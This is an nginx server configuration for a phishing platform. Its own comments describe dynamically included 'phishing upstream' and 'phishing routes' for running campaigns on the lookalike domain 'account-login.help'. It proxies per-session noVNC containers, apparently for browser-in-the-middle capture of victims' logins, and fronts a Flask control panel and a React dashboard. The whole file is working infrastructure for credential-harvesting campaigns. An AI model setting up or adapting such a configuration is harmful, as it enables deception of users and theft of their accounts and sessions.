worker_processes auto;
error_log /var/log/nginx/error.log warn;
pid /var/run/nginx.pid;

events {
    worker_connections 1024;
}

http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    sendfile on;
    keepalive_timeout 65;
    client_max_body_size 50m;

    # Phishing upstream - dynamically included when campaign runs
    include /etc/nginx/conf.d/upstream_revproxy.conf;

    # HTTP -> HTTPS redirect
    server {
        listen 80;
        server_name _;

        location /.well-known/acme-challenge/ {
            root /var/www/certbot;
        }

        location / {
            return 301 https://$host$request_uri;
        }
    }

    # HTTPS - serves React frontend + API + phishing
    server {
        listen 443 ssl;
        server_name account-login.help;

        ssl_certificate /etc/letsencrypt/live/account-login.help/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/account-login.help/privkey.pem;
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers HIGH:!aNULL:!MD5;
        ssl_prefer_server_ciphers on;

        # VNC proxy - forwards to noVNC containers via Docker DNS
        location ~ ^/vnc/([^/]+)/(.+)$ {
            resolver 127.0.0.11 valid=30s;
            set $vnc_container $1;
            set $vnc_path $2;
            proxy_pass http://$vnc_container:6901/$vnc_path$is_args$args;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
            proxy_set_header Host $vnc_container;
            proxy_read_timeout 3600;
            proxy_send_timeout 3600;
            proxy_buffering off;
        }

        # API routes -> Flask backend
        location /api/ {
            proxy_pass http://panel:5000;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_set_header Authorization $http_authorization;
            proxy_pass_header Authorization;
            proxy_connect_timeout 300;
            proxy_send_timeout 300;
            proxy_read_timeout 300;
        }

        # Legacy panel routes -> Flask (keep old UI accessible)
        location /login { proxy_pass http://panel:5000; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; }
        location /logout { proxy_pass http://panel:5000; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; }
        location /old-dashboard { proxy_pass http://panel:5000/dashboard; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; }
        location /flask-static/ { proxy_pass http://panel:5000/static/; }

        # Phishing routes - dynamically included when campaign is running
        include /etc/nginx/conf.d/phishing_routes.conf;

        # React frontend - serve static files
        root /usr/share/nginx/html;
        index index.html;

        location /static/ {
            expires 1y;
            add_header Cache-Control "public, immutable";
            try_files $uri =404;
        }

        location /asset-manifest.json {
            try_files $uri =404;
        }

        location /manifest.json {
            try_files $uri =404;
        }

        location /favicon.ico {
            try_files $uri =404;
        }

        # All other routes -> React SPA (client-side routing)
        location / {
            try_files $uri $uri/ /index.html;
        }
    }
}
